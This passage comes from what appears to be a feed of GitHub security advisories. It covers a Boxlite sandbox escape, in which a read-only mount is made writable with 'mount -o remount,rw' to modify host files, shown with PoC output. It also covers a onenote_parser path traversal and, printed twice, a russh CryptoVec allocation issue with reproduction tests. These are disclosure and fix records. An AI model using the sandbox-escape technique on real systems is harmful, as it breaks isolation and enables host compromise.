    /proc/mounts: uservol0 /mnt/sensitive virtiofs ro,relatime 0 0

[+] Step 4: Testing write protection (initial state)...
    Write attempt: write_exit:1

[!!!] Step 5: ATTACK - Bypassing read-only via remount...
    Remount result: remount_exit:0
    Mount flags after: uservol0 /mnt/sensitive virtiofs rw,relatime 0 0

[!!!] Step 6: Writing to 'read-only' mount after bypass...
    Write result: write_exit:0
    File content inside guest: modified content

[+] Step 7: HOST VERIFICATION
    read_only.txt on host: modified content

FINAL RESULT:

  [!!!] VULNERABILITY CONFIRMED - EXPLOITABLE

[+] Cleanup: removed /tmp/virtiofs_ro_poc_93fdis21
</code></pre>
</li>
</ol>
<h4 id="impact">Impact</h4>
<p>Malicious code can perform arbitrary write operations on directories that should be read-only.</p>
<p>In typical usage scenarios of Boxlite, an attacker can leverage this vulnerability to gain code execution capability on the host. For example, in AI Agent scenarios, user code, virtual environments, credentials, configuration files, and other content are often mounted in read-only mode into the container. Malicious code inside the sandbox can modify this information, such as planting malicious code, to gain code execution capability on the host, which may further introduce supply chain risks.</p>
<h4 id="score">Score</h4>
<p>Severity: Critical, Score: 10.0, rationale as follows: </p>
<ul>
<li><strong>AV:N</strong> — Malicious code can be transmitted through networks, such as code written by large language models.</li>
<li><strong>AC:L</strong> — No special conditions or race conditions are required. The attacker simply executes a <code>mount -o remount,rw</code> command inside the container. <code>CAP_SYS_ADMIN</code> is granted by default, and the attack is deterministic and trivially reproducible.</li>
<li><strong>PR:N</strong> — The attacker needs the ability to execute arbitrary code inside the Boxlite sandbox, which is the fundamental use case of Boxlite (running untrusted code). </li>
<li><strong>UI:N</strong> — No user interaction is required. Malicious code inside the container can autonomously exploit this vulnerability without any action from the host operator.</li>
<li><strong>S:C</strong> — The vulnerability allows the attacker to cross the sandbox trust boundary and impact the host system. The vulnerable component is the Boxlite sandbox isolation mechanism, but the impacted component is the host filesystem.</li>
<li><strong>C:H</strong> — With write access to host directories, the attacker can plant malicious code that will be executed by the host, leading to full compromise of sensitive host data including credentials, API keys, user code, and configuration files mounted into the container.</li>
<li><strong>I:H</strong> — The attacker gains full write access to host directories explicitly intended to be read-only, allowing arbitrary modification of host files including planting backdoors, modifying virtual environments for supply chain attacks, and altering credentials and configuration files.</li>
<li><strong>A:N</strong> — The vulnerability primarily enables unauthorized write access. The host system and Boxlite service continue to function; no distinct availability impact mechanism exists beyond secondary consequences of write access.</li>
</ul>
<h4 id="credit">Credit</h4>
<p>This vulnerability was discovered by:</p>
<ul>
<li>XlabAI Team of Tencent Xuanwu Lab</li>
<li>Atuin Automated Vulnerability Discovery Engine</li>
</ul>
<p>CVE and credit are preferred.</p>
<p>If there are any questions regarding the vulnerability details, please feel free to reach out to us for further discussion. Our email address is <a href="mailto:xlabai@tencent.com">xlabai@tencent.com</a>.</p>
<h4 id="note">Note</h4>
<p>Note that BoxLite follows the industry-standard <strong>90+30 disclosure policy</strong> (Reference: <a href="https://googleprojectzero.blogspot.com/p/vulnerability-disclosure-policy.html">https://googleprojectzero.blogspot.com/p/vulnerability-disclosure-policy.html</a>). This means that BoxLite reserves the right to disclose the details of the vulnerability 30 days after the fix has been implemented.</p>
<h4 id="resolution">Resolution</h4>
<p>Fixed in <strong>v0.9.0</strong> by PR #454 (commit <code>2c26968e</code>), released 2026-04-29, with defense-in-depth across three layers:</p>
<ol>
<li><strong>Hypervisor-level read-only enforcement.</strong> virtio-fs shares are now created via <code>krun_add_virtiofs3</code> (libkrun v1.18.0) with the <code>read_only</code> flag passed through, so the share is read-only at the virtio-fs device — before any request reaches the guest kernel. A malicious guest <code>mount -o remount,rw</code> can no longer reach host data even if it regained <code>CAP_SYS_ADMIN</code>.</li>
<li><strong>Capability restriction.</strong> Containers now receive the 14 Docker-default capabilities, explicitly excluding <code>CAP_SYS_ADMIN</code> (and <code>CAP_NET_ADMIN</code>, <code>CAP_SYS_MODULE</code>, <code>CAP_SYS_RAWIO</code>, <code>CAP_MAC_OVERRIDE</code>), so the remount in the PoC fails with <code>EPERM</code>.</li>
<li><strong>TSI network isolation.</strong> When the network is disabled, the implicit vsock is replaced with an explicit vsock with no TSI features, closing a related guest→host socket-forwarding path.</li>
</ol>
<p>Regression coverage: <code>src/boxlite/tests/security_enforcement.rs</code> (Rust core) and <code>sdks/python/tests/test_readonly_volume_remount.py</code> (Python SDK) both replay the PoC remount attack and assert it fails.</p>
<p><strong>Remediation:</strong> upgrade to boxlite <strong>0.9.0 or later</strong> (all SDKs: PyPI <code>boxlite</code>, npm <code>@boxlite-ai/boxlite</code>, Go module <code>github.com/boxlite-ai/boxlite/sdks/go</code>, crates.io <code>boxlite</code> / <code>boxlite-cli</code>). There is no workaround for affected versions; upgrade is required.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/boxlite-ai/boxlite/security/advisories/GHSA-g6ww-w5j2-r7x3">https://github.com/boxlite-ai/boxlite/security/advisories/GHSA-g6ww-w5j2-r7x3</a></li>
<li><a href="https://github.com/boxlite-ai/boxlite/pull/454">https://github.com/boxlite-ai/boxlite/pull/454</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2026-0147.html">https://rustsec.org/advisories/RUSTSEC-2026-0147.html</a></li>
<li><a href="https://github.com/advisories/GHSA-g6ww-w5j2-r7x3">https://github.com/advisories/GHSA-g6ww-w5j2-r7x3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g6ww-w5j2-r7x3</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-05-21T21:52:51.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[onenote_parser] Rust OneNote File Parser: Path traversal in `Parser::parse_notebook` allows reading files outside the notebook directory]]></title>
        <id>https://github.com/advisories/GHSA-4j5m-wc25-pvh7</id>
        <link href="https://github.com/advisories/GHSA-4j5m-wc25-pvh7"/>
        <updated>2026-05-21T21:32:11.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A maliciously crafted <code>.onetoc2</code> table-of-contents file can cause <code>Parser::parse_notebook</code> to open arbitrary files on the host filesystem outside the notebook's directory. The parser reads entry names listed inside the <code>.onetoc2</code> and joins them against the notebook's base directory without validating that they are relative paths confined to that directory.</p>
<p>The parser will bail out when the target file fails to parse as a OneNote section, so direct content exfiltration through the parser's return value is not practical, though file-existence probing and denial-of-service via large or special files remain possible.</p>
<p>Anyone using <code>onenote_parser</code> to parse .onetoc2 files received from untrusted sources is affected. Users who only ever parse their own notebooks are not at meaningful risk.</p>
<h3 id="patches">Patches</h3>
<p>Fixed in onenote_parser 1.1.1. The fix rejects absolute paths, parent-directory components, and other invalid path characters in entry names, and additionally canonicalises the resolved path to confirm it stays inside the notebook's base directory.</p>
<h3 id="workarounds">Workarounds</h3>
<p>For users who cannot upgrade to 1.1.1:</p>
<ul>
<li>Only call <code>Parser::parse_notebook</code> on <code>.onetoc2</code> files from trusted sources.</li>
<li>Alternatively, use <code>Parser::parse_section</code> / <code>Parser::parse_section_buffer</code> on individual .one files, which do not perform the directory walk.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/msiemens/onenote.rs/security/advisories/GHSA-4j5m-wc25-pvh7">https://github.com/msiemens/onenote.rs/security/advisories/GHSA-4j5m-wc25-pvh7</a></li>
<li><a href="https://github.com/msiemens/onenote.rs/commit/c9267b2c96e2542be7e7b557d67318e81b733585">https://github.com/msiemens/onenote.rs/commit/c9267b2c96e2542be7e7b557d67318e81b733585</a></li>
<li><a href="https://github.com/msiemens/onenote.rs/blob/master/CHANGELOG.md#111---2026-05-15">https://github.com/msiemens/onenote.rs/blob/master/CHANGELOG.md#111---2026-05-15</a></li>
<li><a href="https://github.com/msiemens/onenote.rs/releases/tag/v1.1.1">https://github.com/msiemens/onenote.rs/releases/tag/v1.1.1</a></li>
<li><a href="https://github.com/advisories/GHSA-4j5m-wc25-pvh7">https://github.com/advisories/GHSA-4j5m-wc25-pvh7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4j5m-wc25-pvh7</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-21T21:32:11.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[russh] Russh: Unchecked CryptoVec allocation and growth handling is reachable]]></title>
        <id>https://github.com/advisories/GHSA-g9f8-wqj9-fjw5</id>
        <link href="https://github.com/advisories/GHSA-g9f8-wqj9-fjw5"/>
        <updated>2026-05-21T20:49:08.000Z</updated>
        <content type="html"><![CDATA[<h3>Title</h3>
<p>Unchecked <code>CryptoVec</code> allocation and growth handling was reachable from local agent inputs in current <code>russh</code> releases and from remote SSH traffic in historical pre-<code>0.58.0</code> releases</p>
<h3 id="summary">Summary</h3>
<p><code>CryptoVec</code> used unchecked capacity growth, unchecked length arithmetic, and unsafe allocation/locking paths. In current <code>russh</code> releases, local SSH agent peers could still feed attacker-controlled frame lengths into buffer growth before validation. In older <code>russh</code> releases before <code>0.58.0</code>, remote SSH traffic also reached <code>CryptoVec</code> through transport and compression buffers.</p>
<h3 id="details">Details</h3>
<p>The underlying unsafe paths were in <code>CryptoVec</code>:</p>
<ul>
<li><code>cryptovec/src/cryptovec.rs</code><ul>
<li>unchecked capacity growth</li>
<li>unchecked length arithmetic in growth callers</li>
<li>raw allocation and reallocation paths coupled to those sizes</li>
</ul>
</li>
<li><code>cryptovec/src/platform/unix.rs</code><ul>
<li><code>mlock</code> / <code>munlock</code> previously accepted zero-length calls and performed null-pointer validation inside the <code>unsafe</code> OS-call path</li>
</ul>
</li>
</ul>
<p>There are two relevant reachability stories:</p>
<ol>
<li>current local reachability in <code>russh</code></li>
</ol>
<ul>
<li><code>russh/src/keys/agent/client.rs</code><ul>
<li><code>AgentClient::read_response()</code> read a peer-supplied <code>u32</code> length and then resized <code>self.buf</code> to that value before reading the payload</li>
</ul>
</li>
<li><code>russh/src/keys/agent/server.rs</code><ul>
<li><code>Connection::run()</code> read a peer-supplied <code>u32</code> length and then resized <code>self.buf</code> to that value before reading the payload</li>
</ul>
</li>
</ul>
<p>This is the path that still existed in current <code>0.60.x</code> releases before the fix, although by then those buffers were no longer <code>CryptoVec</code>.</p>
<ol start="2">
<li>historical remote reachability in older <code>russh</code></li>
</ol>
<ul>
<li>before commit <code>712e32b</code> (first released in <code>v0.58.0</code>), non-secret transport and compression buffers in <code>russh</code> still used <code>CryptoVec</code></li>
<li>I verified this in a detached pre-<code>712e32b</code> worktree by adding and running:<ul>
<li><code>cipher::tests::remote_packet_length_grows_transport_cryptovec_buffer</code></li>
<li><code>compression::tests::remote_compressed_payload_expands_cryptovec_output</code></li>
</ul>
</li>
<li>those tests show that remote SSH traffic could grow <code>CryptoVec</code> through:<ul>
<li>transport packet reads</li>
<li>zlib decompression output</li>
</ul>
</li>
</ul>
<p>Also added a constrained-memory reproduction in that historical worktree:</p>
<ul>
<li><code>compression::tests::remote_compressed_payload_can_crash_under_memory_limit</code></li>
</ul>
<p>That test re-execs the test binary under <code>prlimit --as=134217728</code>, decompresses a highly compressible payload that expands to <code>96 MiB</code>, and reliably aborts in the old Unix <code>CryptoVec</code> path when <code>NonNull::new_unchecked()</code> receives a null pointer after allocation failure.</p>
<p>The prepared patch does two things:</p>
<ol>
<li><p>hardens <code>CryptoVec</code> itself</p>
<ul>
<li>checked capacity growth</li>
<li>checked length arithmetic</li>
<li>immediate allocation-failure handling</li>
<li>zero-length <code>mlock</code> / <code>munlock</code> no-ops</li>
<li>explicit null-pointer validation before entering the Unix <code>unsafe</code> locking calls</li>
</ul>
</li>
<li><p>hardens the real untrusted-input path</p>
<ul>
<li>caps agent frame lengths at <code>256 * 1024</code> on both client and server before resizing buffers</li>
</ul>
</li>
</ol>
<p>This cap matches OpenSSH’s agent framing guardrail.</p>
<h3 id="poc">PoC</h3>
<p>The following end-to-end tests demonstrate the real untrusted-input path by feeding oversized peer-controlled agent frame lengths into the public client and server flows and asserting that they are rejected before buffer growth.</p>
<p>Client-side agent reply path:</p>
<pre><code class="language-rust">#[test]
fn oversized_agent_response_is_rejected_before_allocation() -&gt; std::io::Result&lt;()&gt; {
    let runtime = tokio::runtime::Builder::new_current_thread()
        .enable_all()
        .build()?;

    runtime.block_on(async {
        let (mut writer, reader) = tokio::io::duplex(64);
        let server = tokio::spawn(async move {
            let mut frame = [0u8; 4];
            writer.read_exact(&amp;mut frame).await?;
            let len = BigEndian::read_u32(&amp;frame) as usize;
            let mut body = vec![0; len];
            writer.read_exact(&amp;mut body).await?;

            BigEndian::write_u32(&amp;mut frame, (MAX_AGENT_FRAME_LEN + 1) as u32);
            writer.write_all(&amp;frame).await?;
            Ok::&lt;(), std::io::Error&gt;(())
        });

        let mut client = AgentClient::connect(reader);
        let err = client.request_identities().await.unwrap_err();
        assert!(matches!(err, Error::AgentProtocolError));
        server.await.expect("server task")?;
        Ok::&lt;(), std::io::Error&gt;(())
    })?;

    Ok(())
}
</code></pre>
<p>Server-side agent request path:</p>
<pre><code class="language-rust">#[test]
fn oversized_agent_request_is_rejected_before_allocation() -&gt; std::io::Result&lt;()&gt; {
    let runtime = tokio::runtime::Builder::new_current_thread()
        .enable_all()
        .build()?;

    runtime.block_on(async {
        let (server, mut client) = tokio::io::duplex(64);
        let connection = Connection {
            lock: Lock(std::sync::Arc::new(std::sync::RwLock::new(crate::CryptoVec::new()))),
            keys: KeyStore(std::sync::Arc::new(std::sync::RwLock::new(
                std::collections::HashMap::new(),
            ))),
            agent: Some(()),
            s: server,
            buf: Vec::new(),
        };
        let server = tokio::spawn(async move { connection.run().await });

        let mut frame = [0u8; 4];
        BigEndian::write_u32(&amp;mut frame, (MAX_AGENT_FRAME_LEN + 1) as u32);
        client.write_all(&amp;frame).await?;
        drop(client);

        let err = server.await.expect("server task").unwrap_err();
        assert!(matches!(err, Error::AgentProtocolError));
        Ok::&lt;(), std::io::Error&gt;(())
    })?;

    Ok(())
}
</code></pre>
<p>These tests pass on the fixed branch and fail on unfixed <code>v0.60.2</code>, where oversized agent frame lengths are not rejected at the framing boundary.</p>
<p>For historical <code>russh &lt; 0.58.0</code>, I also verified remote reachability into <code>CryptoVec</code> in a detached pre-<code>712e32b</code> worktree (<code>91d431d</code>, package version <code>0.57.1</code>).</p>
<p>Transport packet read path:</p>
<pre><code class="language-rust">#[test]
fn remote_packet_length_grows_transport_cryptovec_buffer() -&gt; std::io::Result&lt;()&gt; {
    let runtime = tokio::runtime::Builder::new_current_thread()
        .enable_all()
        .build()?;

    runtime.block_on(async {
        let packet_len = MAXIMUM_PACKET_LEN;
        let (mut writer, mut reader) = tokio::io::duplex(packet_len + 4);
        let writer_task = tokio::spawn(async move {
            let mut packet = vec![0u8; packet_len + 4];
            packet[..4].copy_from_slice(&amp;(packet_len as u32).to_be_bytes());
            writer.write_all(&amp;packet).await?;
            Ok::&lt;(), std::io::Error&gt;(())
        });

        let mut buffer = SSHBuffer::new();
        let mut cipher = clear::Key;
        let n = read(&amp;mut reader, &amp;mut buffer, &amp;mut cipher).await.unwrap();

        assert_eq!(n, packet_len + 4);
        assert_eq!(buffer.buffer.len(), packet_len + 4);
        assert_eq!(&amp;buffer.buffer[..4], &amp;(packet_len as u32).to_be_bytes());

        writer_task.await.expect("writer task")?;
        Ok::&lt;(), std::io::Error&gt;(())
    })?;

    Ok(())
}
</code></pre>
<p>Compression growth path:</p>
<pre><code class="language-rust">#[test]
fn remote_compressed_payload_expands_cryptovec_output() {
    let payload = vec![b'A'; 64 * 1024];

    let compression = Compression::new(&amp;ZLIB);
    let mut compressor = Compress::None;
    let mut decompressor = Decompress::None;
    compression.init_compress(&amp;mut compressor);
    compression.init_decompress(&amp;mut decompressor);

    let mut compressed = CryptoVec::new();
    let encoded = compressor
        .compress(&amp;payload, &amp;mut compressed)
        .expect("compress")
        .to_vec();

    let mut output = CryptoVec::new();
    let decoded = decompressor
        .decompress(&amp;encoded, &amp;mut output)
        .expect("decompress");

    assert_eq!(decoded.len(), payload.len());
    assert_eq!(decoded, payload.as_slice());
    assert!(encoded.len() &lt; output.len());
}
</code></pre>
<p>Constrained-memory crash reproduction for the historical remote compression path:</p>
<pre><code class="language-rust">#[test]
fn remote_compressed_payload_can_crash_under_memory_limit() {
    const CHILD_ENV: &amp;str = "RUSSH_REMOTE_COMPRESS_CRASH_CHILD";

    if std::env::var_os(CHILD_ENV).is_some() {
        let payload = vec![b'A'; 96 * 1024 * 1024];

        let compression = Compression::new(&amp;ZLIB);
        let mut compressor = Compress::None;
        let mut decompressor = Decompress::None;
        compression.init_compress(&amp;mut compressor);
        compression.init_decompress(&amp;mut decompressor);

        let mut compressed = CryptoVec::new();
        let encoded = compressor
            .compress(&amp;payload, &amp;mut compressed)
            .expect("compress")
            .to_vec();

        let mut output = CryptoVec::new();
        let decoded = decompressor
            .decompress(&amp;encoded, &amp;mut output)
            .expect("decompress");
        assert_eq!(decoded.len(), payload.len());
        return;
    }

    let exe = std::env::current_exe().expect("current exe");
    let status = Command::new("prlimit")
        .args([
            "--as=134217728",
            "--",
            exe.to_str().expect("utf8 exe path"),
            "--exact",
            "compression::tests::remote_compressed_payload_can_crash_under_memory_limit",
            "--nocapture",
        ])
        .env(CHILD_ENV, "1")
        .status()
        .expect("spawn child");

    assert!(
        !status.success(),
        "expected child to fail under constrained address space"
    );
}
</code></pre>
<p>On that historical worktree, the constrained-memory child aborts in the old Unix <code>CryptoVec</code> path with:</p>
<pre><code class="language-text">unsafe precondition(s) violated: NonNull::new_unchecked requires that the pointer is non-null
thread caused non-unwinding panic. aborting.
</code></pre>
<p>To run the reproduced checks:</p>
<pre><code class="language-bash">cargo test -p russh oversized_agent_response_is_rejected_before_allocation -- --nocapture
cargo test -p russh oversized_agent_request_is_rejected_before_allocation -- --nocapture
cargo test -p russh-cryptovec
</code></pre>
<p>Historical pre-<code>0.58.0</code> checks were run from the detached <code>91d431d</code> worktree with:</p>
<pre><code class="language-bash">cargo test --offline -p russh remote_packet_length_grows_transport_cryptovec_buffer -- --nocapture
cargo test --offline -p russh remote_compressed_payload_expands_cryptovec_output -- --nocapture
cargo test --offline -p russh remote_compressed_payload_can_crash_under_memory_limit -- --nocapture
</code></pre>
<h3 id="impact">Impact</h3>
<p>This is a memory-safety hardening issue with demonstrated untrusted-input reachability.</p>
<p>What is demonstrated:</p>
<ul>
<li>current local agent peers could previously reach allocation growth directly from attacker-controlled frame lengths</li>
<li>historical remote SSH traffic could previously reach <code>CryptoVec</code> through transport and compression buffers in <code>russh &lt; 0.58.0</code></li>
<li>under constrained memory, the historical remote compression path can be turned into a process abort in the old Unix <code>CryptoVec</code> code</li>
<li>the fixed code now rejects oversized agent frames early and hardens the underlying allocation paths</li>
</ul>
<p>What is not demonstrated:</p>
<ul>
<li>practical code execution</li>
<li>a demonstrated integrity or confidentiality break</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Eugeny/russh/security/advisories/GHSA-g9f8-wqj9-fjw5">https://github.com/Eugeny/russh/security/advisories/GHSA-g9f8-wqj9-fjw5</a></li>
<li><a href="https://github.com/advisories/GHSA-g9f8-wqj9-fjw5">https://github.com/advisories/GHSA-g9f8-wqj9-fjw5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g9f8-wqj9-fjw5</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-21T20:49:07.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[russh-cryptovec] Russh: Unchecked CryptoVec allocation and growth handling is reachable]]></title>
        <id>https://github.com/advisories/GHSA-g9f8-wqj9-fjw5</id>
        <link href="https://github.com/advisories/GHSA-g9f8-wqj9-fjw5"/>
        <updated>2026-05-21T20:49:08.000Z</updated>
        <content type="html"><![CDATA[<h3>Title</h3>
<p>Unchecked <code>CryptoVec</code> allocation and growth handling was reachable from local agent inputs in current <code>russh</code> releases and from remote SSH traffic in historical pre-<code>0.58.0</code> releases</p>
<h3 id="summary">Summary</h3>
<p><code>CryptoVec</code> used unchecked capacity growth, unchecked length arithmetic, and unsafe allocation/locking paths. In current <code>russh</code> releases, local SSH agent peers could still feed attacker-controlled frame lengths into buffer growth before validation. In older <code>russh</code> releases before <code>0.58.0</code>, remote SSH traffic also reached <code>CryptoVec</code> through transport and compression buffers.</p>
<h3 id="details">Details</h3>
<p>The underlying unsafe paths were in <code>CryptoVec</code>:</p>
<ul>
<li><code>cryptovec/src/cryptovec.rs</code><ul>
<li>unchecked capacity growth</li>
<li>unchecked length arithmetic in growth callers</li>
<li>raw allocation and reallocation paths coupled to those sizes</li>
</ul>
</li>
<li><code>cryptovec/src/platform/unix.rs</code><ul>
<li><code>mlock</code> / <code>munlock</code> previously accepted zero-length calls and performed null-pointer validation inside the <code>unsafe</code> OS-call path</li>
</ul>
</li>
</ul>
<p>There are two relevant reachability stories:</p>
<ol>
<li>current local reachability in <code>russh</code></li>
</ol>
<ul>
<li><code>russh/src/keys/agent/client.rs</code><ul>
<li><code>AgentClient::read_response()</code> read a peer-supplied <code>u32</code> length and then resized <code>self.buf</code> to that value before reading the payload</li>
</ul>
</li>
<li><code>russh/src/keys/agent/server.rs</code><ul>
<li><code>Connection::run()</code> read a peer-supplied <code>u32</code> length and then resized <code>self.buf</code> to that value before reading the payload</li>
</ul>
</li>
</ul>
<p>This is the path that still existed in current <code>0.60.x</code> releases before the fix, although by then those buffers were no longer <code>CryptoVec</code>.</p>
<ol start="2">
<li>historical remote reachability in older <code>russh</code></li>
</ol>
<ul>
<li>before commit <code>712e32b</code> (first released in <code>v0.58.0</code>), non-secret transport and compression buffers in <code>russh</code> still used <code>CryptoVec</code></li>
<li>I verified this in a detached pre-<code>712e32b</code> worktree by adding and running:<ul>
<li><code>cipher::tests::remote_packet_length_grows_transport_cryptovec_buffer</code></li>
<li><code>compression::tests::remote_compressed_payload_expands_cryptovec_output</code></li>
</ul>
</li>
<li>those tests show that remote SSH traffic could grow <code>CryptoVec</code> through:<ul>
<li>transport packet reads</li>
<li>zlib decompression output</li>
</ul>
</li>
</ul>
<p>Also added a constrained-memory reproduction in that historical worktree:</p>
<ul>
<li><code>compression::tests::remote_compressed_payload_can_crash_under_memory_limit</code></li>
</ul>
<p>That test re-execs the test binary under <code>prlimit --as=134217728</code>, decompresses a highly compressible payload that expands to <code>96 MiB</code>, and reliably aborts in the old Unix <code>CryptoVec</code> path when <code>NonNull::new_unchecked()</code> receives a null pointer after allocation failure.</p>
<p>The prepared patch does two things:</p>
<ol>
<li><p>hardens <code>CryptoVec</code> itself</p>
<ul>
<li>checked capacity growth</li>
<li>checked length arithmetic</li>
<li>immediate allocation-failure handling</li>
<li>zero-length <code>mlock</code> / <code>munlock</code> no-ops</li>
<li>explicit null-pointer validation before entering the Unix <code>unsafe</code> locking calls</li>
</ul>
</li>
<li><p>hardens the real untrusted-input path</p>
<ul>
<li>caps agent frame lengths at <code>256 * 1024</code> on both client and server before resizing buffers</li>
</ul>
</li>
</ol>
<p>This cap matches OpenSSH’s agent framing guardrail.</p>
<h3 id="poc">PoC</h3>
<p>The following end-to-end tests demonstrate the real untrusted-input path by feeding oversized peer-controlled agent frame lengths into the public client and server flows and asserting that they are rejected before buffer growth.</p>
<p>Client-side agent reply path:</p>
<pre><code class="language-rust">#[test]
fn oversized_agent_response_is_rejected_before_allocation() -&gt; std::io::Result&lt;()&gt; {
    let runtime = tokio::runtime::Builder::new_current_thread()
        .enable_all()
        .build()?;

    runtime.block_on(async {
        let (mut writer, reader) = tokio::io::duplex(64);
        let server = tokio::spawn(async move {
            let mut frame = [0u8; 4];
            writer.read_exact(&amp;mut frame).await?;
            let len = BigEndian::read_u32(&amp;frame) as usize;
            let mut body = vec![0; len];
            writer.read_exact(&amp;mut body).await?;

            BigEndian::write_u32(&amp;mut frame, (MAX_AGENT_FRAME_LEN + 1) as u32);
            writer.write_all(&amp;frame).await?;
            Ok::&lt;(), std::io::Error&gt;(())
        });

        let mut client = AgentClient::connect(reader);
        let err = client.request_identities().await.unwrap_err();
        assert!(matches!(err, Error::AgentProtocolError));
        server.await.expect("server task")?;
        Ok::&lt;(), std::io::Error&gt;(())
    })?;

    Ok(())
}
</code></pre>
<p>Server-side agent request path:</p>
<pre><code class="language-rust">#[test]
fn oversized_agent_request_is_rejected_before_allocation() -&gt; std::io::Result&lt;()&gt; {
    let runtime = tokio::runtime::Builder::new_current_thread()
        .enable_all()
        .build()?;

    runtime.block_on(async {
        let (server, mut client) = tokio::io::duplex(64);
        let connection = Connection {
            lock: Lock(std::sync::Arc::new(std::sync::RwLock::new(crate::CryptoVec::new()))),
            keys: KeyStore(std::sync::Arc::new(std::sync::RwLock::new(
                std::collections::HashMap::new(),
            ))),
            agent: Some(()),
            s: server,
            buf: Vec::new(),
        };
        let server = tokio::spawn(async move { connection.run().await });

        let mut frame = [0u8; 4];
        BigEndian::write_u32(&amp;mut frame, (MAX_AGENT_FRAME_LEN + 1) as u32);
        client.write_all(&amp;frame).await?;
        drop(client);

        let err = server.await.expect("server task").unwrap_err();
        assert!(matches!(err, Error::AgentProtocolError));
        Ok::&lt;(), std::io::Error&gt;(())
    })?;

    Ok(())
}
</code></pre>
<p>These tests pass on the fixed branch and fail on unfixed <code>v0.60.2</code>, where oversized agent frame lengths are not rejected at the framing boundary.</p>
<p>For historical <code>russh &lt; 0.58.0</code>, I also verified remote reachability into <code>CryptoVec</code> in a detached pre-<code>712e32b</code> worktree (<code>91d431d</code>, package version <code>0.57.1</code>).</p>
<p>Transport packet read path:</p>
<pre><code class="language-rust">#[test]
fn remote_packet_length_grows_transport_cryptovec_buffer() -&gt; std::io::Result&lt;()&gt; {
    let runtime = tokio::runtime::Builder::new_current_thread()
        .enable_all()
        .build()?;

    runtime.block_on(async {
        let packet_len = MAXIMUM_PACKET_LEN;
        let (mut writer, mut reader) = tokio::io::duplex(packet_len + 4);
        let writer_task = tokio::spawn(async move {
            let mut packet = vec![0u8; packet_len + 4];
            packet[..4].copy_from_slice(&amp;(packet_len as u32).to_be_bytes());
            writer.write_all(&amp;packet).await?;
            Ok::&lt;(), std::io::Error&gt;(())
        });

        let mut buffer = SSHBuffer::new();
        let mut cipher = clear::Key;
        let n = read(&amp;mut reader, &amp;mut buffer, &amp;mut cipher).await.unwrap();

        assert_eq!(n, packet_len + 4);
        assert_eq!(buffer.buffer.len(), packet_len + 4);
        assert_eq!(&amp;buffer.buffer[..4], &amp;(packet_len as u32).to_be_bytes());

        writer_task.await.expect("writer task")?;
        Ok::&lt;(), std::io::Error&gt;(())
    })?;

    Ok(())
}
</code></pre>
<p>Compression growth path:</p>
<pre><code class="language-rust">#[test]
fn remote_compressed_payload_expands_cryptovec_output() {
    let payload = vec![b'A'; 64 * 1024];

    let compression = Compression::new(&amp;ZLIB);
    let mut compressor = Compress::None;
    let mut decompressor = Decompress::None;
    compression.init_compress(&amp;mut compressor);
    compression.init_decompress(&amp;mut decompressor);

    let mut compressed = CryptoVec::new();
    let encoded = compressor
        .compress(&amp;payload, &amp;mut compressed)
        .expect("compress")
        .to_vec();

    let mut output = CryptoVec::new();
    let decoded = decompressor
        .decompress(&amp;encoded, &amp;mut output)
        .expect("decompress");

    assert_eq!(decoded.len(), payload.len());
    assert_eq!(decoded, payload.as_slice());
    assert!(encoded.len() &lt; output.len());
}
</code></pre>
<p>Constrained-memory crash reproduction for the historical remote compression path:</p>
<pre><code class="language-rust">#[test]
fn remote_compressed_payload_can_crash_under_memory_limit() {
    const CHILD_ENV: &amp;str = "RUSSH_REMOTE_COMPRESS_CRASH_CHILD";

    if std::env::var_os(CHILD_ENV).is_some() {
        let payload = vec![b'A'; 96 * 1024 * 1024];

        let compression = Compression::new(&amp;ZLIB);
        let mut compressor = Compress::None;
        let mut decompressor = Decompress::None;
        compression.init_compress(&amp;mut compressor);
        compression.init_decompress(&amp;mut decompressor);

        let mut compressed = CryptoVec::new();
        let encoded = compressor
            .compress(&amp;payload, &amp;mut compressed)
            .expect("compress")
            .to_vec();

        let mut output = CryptoVec::new();
        let decoded = decompressor
            .decompress(&amp;encoded, &amp;mut output)
            .expect("decompress");
        assert_eq!(decoded.len(), payload.len());
        return;
    }

    let exe = std::env::current_exe().expect("current exe");
    let status = Command::new("prlimit")
        .args([
            "--as=134217728",
            "--",
            exe.to_str().expect("utf8 exe path"),
            "--exact",
            "compression::tests::remote_compressed_payload_can_crash_under_memory_limit",
            "--nocapture",
        ])
        .env(CHILD_ENV, "1")
        .status()
        .expect("spawn child");

    assert!(
        !status.success(),
        "expected child to fail under constrained address space"
    );
}
</code></pre>
<p>On that historical worktree, the constrained-memory child aborts in the old Unix <code>CryptoVec</code> path with:</p>
<pre><code class="language-text">unsafe precondition(s) violated: NonNull::new_unchecked requires that the pointer is non-null
thread caused non-unwinding panic. aborting.
</code></pre>
<p>To run the reproduced checks:</p>
<pre><code class="language-bash">cargo test -p russh oversized_agent_response_is_rejected_before_allocation -- --nocapture
cargo test -p russh oversized_agent_request_is_rejected_before_allocation -- --nocapture
cargo test -p russh-cryptovec
</code></pre>
<p>Historical pre-<code>0.58.0</code> checks were run from the detached <code>91d431d</code> worktree with:</p>
<pre><code class="language-bash">cargo test --offline -p russh remote_packet_length_grows_transport_cryptovec_buffer -- --nocapture
cargo test --offline -p russh remote_compressed_payload_expands_cryptovec_output -- --nocapture
cargo test --offline -p russh remote_compressed_payload_can_crash_under_memory_limit -- --nocapture
</code></pre>
<h3 id="impact">Impact</h3>
<p>This is a memory-safety hardening issue with demonstrated untrusted-input reachability.</p>
<p>What is demonstrated:</p>
